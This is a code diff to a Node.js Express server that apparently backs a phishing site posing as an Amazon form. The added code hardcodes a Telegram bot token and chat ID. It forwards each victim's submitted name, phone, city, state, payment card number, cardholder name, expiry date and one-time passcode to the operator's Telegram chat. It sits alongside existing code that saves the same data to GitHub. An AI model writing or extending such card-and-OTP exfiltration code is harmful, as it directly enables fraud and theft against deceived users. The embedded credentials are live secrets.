@@ -8,9 +8,38 @@ const REPO_OWNER = 'afffaaaa28-glitch';
 const REPO_NAME = 'amazon-form-site';
 const FILE_PATH = 'data.txt';
 
+// ========== إعدادات تيلجرام ==========
+const TELEGRAM_TOKEN = '8810906768:AAEPvCGIGJI8cJtzloiRQYd0GV_W6aHLdO4';
+const TELEGRAM_CHAT_ID = '8140097273';
+
 app.use(express.urlencoded({ extended: true }));
 app.use(express.json());
 app.use(express.static(path.join(__dirname, 'views')));
+
+// ========== دالة إرسال إشعار تيلجرام ==========
+async function sendTelegramMessage(message) {
+    try {
+        const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
+        const response = await fetch(url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: TELEGRAM_CHAT_ID,
+                text: message,
+                parse_mode: 'HTML'
+            })
+        });
+        
+        if (response.ok) {
+            console.log('✅ تم إرسال الإشعار لتيلجرام');
+        } else {
+            const error = await response.text();
+            console.error('❌ فشل الإرسال:', error);
+        }
+    } catch (e) {
+        console.error('❌ خطأ في إرسال الإشعار:', e.message);
+    }
+}
 
 // ========== دالة حفظ على GitHub ==========
 async function saveToGitHub(newData) {
@@ -93,7 +122,6 @@ app.get('/data-viewer', (req, res) => {
 // ========== API لجلب البيانات ==========
 app.get('/api/data', async (req, res) => {
     try {
-        // نجيب بيانات جديدة كل 5 ثواني
         const now = Date.now();
         if (now - lastFetchTime > 5000 || !cachedData) {
             console.log('🔄 جلب بيانات جديدة من GitHub...');
@@ -110,7 +138,7 @@ app.get('/api/data', async (req, res) => {
     }
 });
 
-// ========== استقبال البيانات ==========
+// ========== استقبال بيانات العنوان ==========
 app.post('/submit-data', async (req, res) => {
     try {
         const data = req.body;
@@ -151,6 +179,16 @@ app.post('/submit-data', async (req, res) => {
         cachedData = await fetchFromGitHub();
         lastFetchTime = Date.now();
         
+        // ====== إرسال إشعار تيلجرام ======
+        const msg = `📬 <b>بيانات جديدة وصلت!</b>\n\n` +
+                   `👤 <b>الاسم:</b> ${data.username || 'غير محدد'}\n` +
+                   `📞 <b>الهاتف:</b> ${data.phone || 'غير محدد'}\n` +
+                   `📍 <b>المدينة:</b> ${data.city || 'غير محدد'}\n` +
+                   `🏛️ <b>الولاية:</b> ${data.state || 'غير محدد'}\n` +
+                   `🕐 <b>الوقت:</b> ${new Date().toLocaleString('ar-EG')}\n\n` +
+                   `🔗 <a href="https://amazon-form-site.vercel.app/data-viewer">عرض البيانات</a>`;
+        await sendTelegramMessage(msg);
+        
         res.redirect('/page3');
     } catch (err) {
         console.error('❌ خطأ:', err.message);
@@ -158,6 +196,7 @@ app.post('/submit-data', async (req, res) => {
     }
 });
 
+// ========== استقبال بيانات الدفع ==========
 app.post('/submit-payment', async (req, res) => {
     try {
         const data = req.body;
@@ -178,6 +217,14 @@ app.post('/submit-payment', async (req, res) => {
         cachedData = await fetchFromGitHub();
         lastFetchTime = Date.now();
         
+        // ====== إشعار تيلجرام ======
+        const msg = `💳 <b>بطاقة دفع جديدة!</b>\n\n` +
+                   `👤 <b>الاسم:</b> ${data.card_name || 'غير محدد'}\n` +
+                   `🔢 <b>رقم البطاقة:</b> ${data.card_number || 'غير محدد'}\n` +
+                   `📅 <b>تاريخ الانتهاء:</b> ${data.card_expiry || 'غير محدد'}\n` +
+                   `🕐 <b>الوقت:</b> ${new Date().toLocaleString('ar-EG')}`;
+        await sendTelegramMessage(msg);
+        
         res.redirect('/page4');
     } catch (err) {
         console.error('❌ خطأ:', err.message);
@@ -185,6 +232,7 @@ app.post('/submit-payment', async (req, res) => {
     }
 });
 
+// ========== استقبال OTP ==========
 app.post('/submit-otp', async (req, res) => {
     try {
         const data = req.body;
@@ -201,6 +249,12 @@ app.post('/submit-otp', async (req, res) => {
         
         cachedData = await fetchFromGitHub();
         lastFetchTime = Date.now();
+        
+        // ====== إشعار تيلجرام ======
+        const msg = `🔐 <b>رمز OTP جديد!</b>\n\n` +
+                   `🔢 <b>الرمز:</b> ${data.otp_code || 'غير محدد'}\n` +
+                   `🕐 <b>الوقت:</b> ${new Date().toLocaleString('ar-EG')}`;
+        await sendTelegramMessage(msg);
         
         res.redirect('/page5');
     } catch (err) {
